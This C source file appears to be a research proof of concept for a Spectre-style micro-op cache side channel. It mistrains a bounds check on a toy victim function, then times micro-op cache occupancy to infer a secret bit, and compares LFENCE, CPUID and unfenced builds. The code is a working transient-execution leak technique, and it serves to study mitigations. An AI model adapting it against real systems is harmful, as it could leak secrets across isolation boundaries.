#include "stripes.hpp"
#include "pfc.h"
#include <stdio.h>
#ifdef _MSC_VER // ms visual c
    #include <intrin.h>
    #pragma optimize("gt",on)
#else // gcc
    #include <x86intrin.h>
#endif

#ifndef SAMPLES
#define SAMPLES 1000
#endif

typedef int func(void);

// All of the tiger functions are aligned to 1024 to ensure they begin at set 0 of 
// the micro-op cache, which allows us only to occupy specific sets of the cache.

// This is used as a dummy function so we only call actual tigers when necessary
__attribute__ ((noinline))
__attribute__ ((aligned(1024)))
void tiger_fake(){
}

// This tiger occupies all sets and ways in the micro-op cache which allows 
// us to "flush" the micro-op cache.
__attribute__ ((noinline))
__attribute__ ((aligned(1024)))
void tiger_super(){
    STRIPES_SUPER;
}

#define tf ((uint64_t)&tiger_fake)
#define ts ((uint64_t)&tiger_super)

// This tiger will occupy all ways of micro-op cache sets 21-31 (inclusive)
// In practice this function would occupy whatever sets the victim_function's 
// function call (eg tiger_0_copy) occupies.
__attribute__ ((noinline))
__attribute__ ((aligned(1024)))
void tiger_0(){
    STRIPES_0;
}

// This second tiger occupies the same sets and ways as tiger_0()
// The key is that tiger_0() and tiger_0_copy will evict eachother from the micro-op cache.
// This allows us to determine which is currently present in the cache.
// In practice this function could be anything and then the attacker could generate 
// a corresponding tiger_0 which occupies the same sets.
__attribute__ ((noinline))
__attribute__ ((aligned(1024)))
void tiger_0_copy(){
    STRIPES_0;
}

#define t0 ((uint64_t)&tiger_0)
#define c0 ((uint64_t)&tiger_0_copy)

uint16_t secret = 0;
uint8_t array[500];
uint64_t bounds = 500;

__attribute__ ((noinline))
__attribute__ ((aligned(1024)))
void victim_function(uint64_t b) {
    if (b < bounds){  // Placeholder for security check

        // Based on preprocessor directive, insert a fence
        // The nop's ensure that each fence is the same length
#if defined(CPUID)
        asm volatile("CPUID");
        asm volatile("nop");
#elif defined(LFENCE)
        asm volatile("lfence");
#else
        asm volatile("nop");
        asm volatile("nop");
        asm volatile("nop");
#endif

        // If secret = 1, call tiger_0_copy
        // In practice the tiger_0_copy could be replaced with any function call
        // The attacker can then generate a corresponding tiger_0 which occupies the same sets
        ((func*) (tf+(secret*(c0-tf))))();

        // This proves that we are speculating (otherwise, this would cause an error)
        // This call is not necessary to carry out the attack.
        array[b] = 9; 
    }
}

__attribute__ ((noinline))
__attribute__ ((aligned(1024)))
void run_victim(uint16_t a_temp, uint64_t b1, uint64_t b2){
    pfc_reset();

    // Set the secret
    secret = a_temp;

    for (int i = 0; i < SAMPLES; i++){
      size_t x_train = b1;
      size_t x_target = b2;
      size_t temp = 0;
      uint8_t y;

      // Call victim function 100 times in this order:
      // 49 training calls, 1 malicious call, 49 training calls, 1 malicious call
      for (int j=99; j>=0; j--){
         size_t x=((j%50)-1)&~0xFFF;
         temp=(x|(x>>16));
         x=(x_train)^(temp&(x_target^x_train));        
         y=0^(temp&1); // 1 if malicious, 0 if train

         // If malicious, call tiger_super() * 2 (This "flushes" the micro-op cache)
         // The purpose of this function is to ensure that the differences we observe in the micro-op cache 
         // are caused by the malicious call loading in a tiger_0 or tiger_0_copy and not the training runs.
         ((func*) (tf+(y*(ts-tf))))();
         ((func*) (tf+(y*(ts-tf))))();

         // If malicious, call tiger_0() * 2 (This primes the micro-op cache)
         ((func*) (tf+(y*(t0-tf))))();
         ((func*) (tf+(y*(t0-tf))))();

         // If we flush the bounds variable, we observe better performance (However, this may not be viable)
         _mm_clflush(&bounds);

         asm volatile("CPUID");         

         // This performs the train/malicious call
         victim_function(x);
       }
    asm volatile("CPUID");

      PFC_TIC;

      tiger_0();  // Analyze this to see what was loaded into micro-op cache by malicious call

      PFC_TOC;

    asm volatile("CPUID");
    }
    
    printf("\nCase: Secret = %d, Training_bounds = %ld, Malicious_bounds = %ld\n", secret, b1, b2);

    pfc_print();
}



int main(int argc, const char** argv){
    printf("Compiled with: "); 
    #ifdef LFENCE
    printf("LFENCE,");
    #endif
    #ifdef CPUID
    printf("CPUID,");
    #endif
    printf("\n");

    pfc_setup();

    // Call victim function with 1 and 0
    // Training and Malicious calls are made with valid bounds
    // With LFENCE, CPUID, or no fence: 
    //      We expect the first call to stream significantly fewer instructions from the micro-op cache
    run_victim(1, 400, 400);
    run_victim(0, 400, 400);

    // These are the attack calls
    // Call victim function with 1 and 0
    // Training calls to victim made with valid bounds
    // Malicious calls to victim made with invalid bounds
    // With LFENCE or no fence:
    //      We expect the first call to stream fewer instructions from the micro-op cache
    // With CPUID:
    //      We expect both calls to stream a similar number of instructions from the micro-op cache
    run_victim(1, 400, 9001);
    run_victim(0, 400, 9001);

    // Call victim function with 1 and 0
    // Training and Malicious calls are made with invalid bounds
    // With LFENCE, CPUID, or no fence:
    //      We expect both calls to stream a similar number of instructions from the micro-op cache
    run_victim(1, 9001, 9001);
    run_victim(0, 9001, 9001);

    return 0;
}
